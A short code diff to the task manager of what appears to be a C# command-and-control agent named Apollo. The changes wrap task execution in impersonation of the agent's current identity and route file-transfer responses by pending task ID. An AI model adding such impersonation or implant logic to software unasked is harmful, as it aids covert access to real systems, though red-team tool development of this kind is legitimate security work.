@@ -89,7 +89,11 @@ namespace Apollo.Management.Tasks
                                 OnTaskErrorOrCancel(t, taskObj);
                             }, System.Threading.Tasks.TaskContinuationOptions.OnlyOnCanceled);
                             _runningTasks.TryAdd(t.ID(), t);
-                            taskObj.Start();
+                            using(_agent.GetIdentityManager().GetCurrentPrimaryIdentity().Impersonate())
+                            {
+                                taskObj.Start();
+                            }
+
                         }
 
                     }
@@ -199,11 +203,10 @@ namespace Apollo.Management.Tasks
             {
                 foreach(TaskStatus t in resp.Responses)
                 {
-                    if (!string.IsNullOrEmpty(t.ChunkData))
+                    if (_agent.GetFileManager().GetPendingTransfers().Contains(t.TaskID))
                     {
                         _agent.GetFileManager().ProcessResponse(t);
                     }
-                    //TaskStatusQueue.Enqueue(t);
                 }
             }
             if (resp.Delegates != null && resp.Delegates.Length > 0)
